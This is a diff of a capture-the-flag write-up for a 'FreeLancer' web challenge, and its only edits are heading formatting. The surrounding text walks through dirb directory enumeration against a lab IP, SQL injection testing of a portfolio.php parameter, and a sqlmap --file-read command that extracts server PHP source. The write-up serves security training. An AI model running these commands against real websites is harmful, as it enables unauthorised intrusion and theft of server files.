@@ -1,7 +1,7 @@
 # FreeLancer
 ![Screenshot from 2021-08-16 17-56-39](https://user-images.githubusercontent.com/87865134/129553366-2dd0e7e3-e195-4809-aad5-839d1d69786c.png)
 
-## - Information gathering
+##  Information gathering
 - Use `dirb` to find hidden directories and files
 ```
 dirb http://139.59.166.56:30387/
@@ -15,7 +15,7 @@ dirb http://139.59.166.56:30387/
 
 ![Screenshot from 2021-08-16 17-57-21](https://user-images.githubusercontent.com/87865134/129553541-f63e8b12-226e-4bf8-b425-bca70168eccf.png)
 
-## - Analysis vulnerabilities
+##  Analysis vulnerabilities
 - Test **SQLi** in url `/portfolio.php?id=1`
   - use `sqlmap`
 
@@ -32,7 +32,7 @@ dirb http://139.59.166.56:30387/
 
 > `/administrat/` has file `index.php` 
 
-## - Exploit
+##  Exploit
 - Use `sqlmap` to read file `index.php` in directory `/administrat/`
 ```
 sqlmap -u "http://139.59.166.56:30387/portfolio.php?id=1" --file-read=/var/www/html/administrat/index.php
@@ -64,5 +64,5 @@ sqlmap -u "http://139.59.166.56:30387/portfolio.php?id=1" --file-read=/var/www/h
 
 > Found flag
 
-## - Description
+##  Description
 > **category:** SQL injection
